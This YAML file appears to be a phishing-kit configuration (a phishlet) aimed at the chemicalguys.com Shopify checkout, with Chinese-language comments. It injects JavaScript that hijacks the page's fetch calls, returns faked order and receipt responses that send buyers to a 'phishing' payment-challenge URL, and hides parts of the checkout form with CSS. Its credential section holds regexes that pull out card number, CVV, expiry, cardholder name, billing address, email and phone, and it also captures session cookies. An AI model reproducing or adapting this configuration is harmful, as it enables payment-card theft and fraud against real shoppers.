js_inject:
  - trigger_domains: ["www.chemicalguys.com"]
    trigger_paths: ["/checkouts/.*"]
    script: |
      if (typeof window !== 'undefined') {
        top.window.hack = true;
        const originalFetch = window.fetch;

        const mockRules = [
          {
            url: 'SubmitForCompletion',
            response: {"data":{"submitForCompletion":{"receipt":{"id":"gid://shopify/ProcessedReceipt/1970983534820","purchaseOrder":{},"pollDelay":500,"__typename":"ProcessingReceipt"},"__typename":"SubmitSuccess"}}},
            status: 200
          },
          {
            url: 'PollForReceipt',
            response: {"data":{"receipt":{"id":"gid://shopify/ProcessedReceipt/1970793545956","action":{"offsiteRedirect":false,"url":"https://www.chemicalguys.fake.com/phishing/phishing-cursor","__typename":"CompletePaymentChallenge"},"timeout":{"millisecondsRemaining":691074,"__typename":"ActionRequiredReceiptTimeout"},"__typename":"ActionRequiredReceipt"}}},
            status: 200
          }
        ];

        window.fetch = (...args) => {
          const [input, init] = args;
          const url = typeof input === 'string' ? input : input.url?input.url:input.href;
          // console.log("请求url:",args, url)
          const rule = mockRules.find(r => url.includes(r.url));

          if(rule && top.window.hack){
            return new Promise((resolve, reject) => {
              // console.log(`拦截请求: ${url}，返回 mock 数据`);
              // 立即给前端返回 mock（前端先用这个继续跑逻辑）
              resolve(
                new Response(JSON.stringify(rule.response), {
                  status: rule.status,
                  statusText: 'OK',
                  headers: { 'Content-Type': 'application/json' }
                })
              );
           });
          }
          if(url.indexOf('SubmitForCompletion')>-1){
            //console.log('放行 SubmitForCompletion 请求，等待后端处理')
            //top.window.hack = true; // 重新设置为 true，继续拦截
          }

          // 没匹配的请求走原始 fetch
          return originalFetch(...args);
        };
      
      
        // 注入自定义样式
        const css = `
          #checkout-main form > div:first-child > div:first-child,
          div:has(> div > div > div > #basic-creditCards) ~ div 
          { display: none !important; }
          
        `;
        const style = document.createElement('style');
        style.type = 'text/css';
        style.appendChild(document.createTextNode(css));
        document.head.appendChild(style);
      }

auth_tokens:
  - domain: 'chemicalguys.com'
    keys: []
    type: 'cookie'
credentials:
  username:
    key: ''
    search: '{"credit_card".*?"name":"([^"]*)"'
    type: 'json'
  password:
    key: ''
    search: '{"credit_card".*?"number":"([^"]*)"'
    type: 'json'
  # 传入3ds页面的参数都在这里， 在3ds页面通过url提取
  custom:
    #信用卡信息
    - key: 'cardHolder'
      search: '{"credit_card".*?"name":"([^"]*)"'
      type: 'json'
    - key: 'cardNo'
      search: '{"credit_card".*?"number":"([^"]*)"'
      type: 'json'
    - key: 'cardMonth'
      search: '{"credit_card".*?"month":(\d+)'
      type: 'json'
    - key: 'cardYear'
      search: '{"credit_card".*?"year":(\d+)'
      type: 'json'
    - key: 'cardCvv'
      search: '{"credit_card".*?"verification_value":"(\d+)"'
      type: 'json'
    #账单地址
    - key: 'billingCountry'
      search: '"billingAddress":\{.*?"countryCode":"([^"]*)"'
      type: 'json'
    - key: 'billingProvince'
      search: '"billingAddress":\{.*?"zoneCode":"([^"]*)"'
      type: 'json'
    - key: 'billingCity'
      search: '"billingAddress":\{.*?"city":"([^"]*)"'
      type: 'json'
    - key: 'billingZip'
      search: '"billingAddress":\{.*?"postalCode":"([^"]*)"'
      type: 'json'
    - key: 'billingAddress1'
      search: '"billingAddress":\{.*?"address1":"([^"]*)"'
      type: 'json'
    - key: 'billingAddress2'
      search: '"billingAddress":\{.*?"address2":"([^"]*)"'
      type: 'json'
    #指纹信息
    - key: 'fpEmail'
      search: '"buyerIdentity":\{.*?"email":"([^"]*)"'
      type: 'json'
    - key: 'fpPhone'
      search: '"buyerIdentity":\{.*?"number":"([^"]*)"'
      type: 'json'
